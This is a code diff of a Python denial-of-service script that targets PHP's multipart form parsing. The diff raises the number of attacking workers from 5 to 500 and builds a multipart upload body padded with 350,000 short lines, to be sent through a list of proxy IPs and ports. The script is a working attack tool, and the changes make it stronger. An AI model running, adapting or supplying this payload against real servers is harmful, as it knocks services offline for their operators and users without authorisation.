@@ -20,7 +20,6 @@ from optparse import OptionParser
 from multiprocessing import Pool
 
 import sys
-import urllib
 
 try:
     import urllib2
@@ -36,7 +35,7 @@ import random
 
 # change variables below to modify requests' number and workers' number
 request_num = 350000
-worker_num = 5
+worker_num = 500
 
 
 def check_php_multipartform_dos(url, post_body, headers, ip):
@@ -77,13 +76,6 @@ def get_stock_html(URL):
         return str(b''.join(response.readlines()))
 
 
-def Getting_Url():
-        global CC_Url
-        file = open('url', 'r')
-        CC_Url = file.readlines()
-        file.close()
-
-
 def getting_list():
         global IP_Port
         IP_Port = []
@@ -120,16 +112,16 @@ def main():
     headers["User-Agent"] += "AppleWebKit/537.36 (KHTML, like Gecko) "
     headers["User-Agent"] += "Chrome/40.0.2214.111 Safari/537.36"
 
-    body = "------WebKitFormBoundaryX3B7rDMPcQlzmJE1\n"
-    body += "Content-Disposition: form-data; name=\"file\"; filename=sp.jpg"
+    body = b"------WebKitFormBoundaryX3B7rDMPcQlzmJE1\n"
+    body += b"Content-Disposition: form-data; name=\"file\"; filename=sp.jpg"
 
-    payload = ""
+    payload = b""
     for i in range(0, request_num):
-        payload += "a\n"
+        payload += b"a\n"
     body += payload
 
-    body += "Content-Type: application/octet-stream\r\n\r\ndatadata\r\n"
-    body += "------WebKitFormBoundaryX3B7rDMPcQlzmJE1--"
+    body += b"Content-Type: application/octet-stream\r\n\r\ndatadata\r\n"
+    body += b"------WebKitFormBoundaryX3B7rDMPcQlzmJE1--"
     print("starting...")
 
     getting_list()
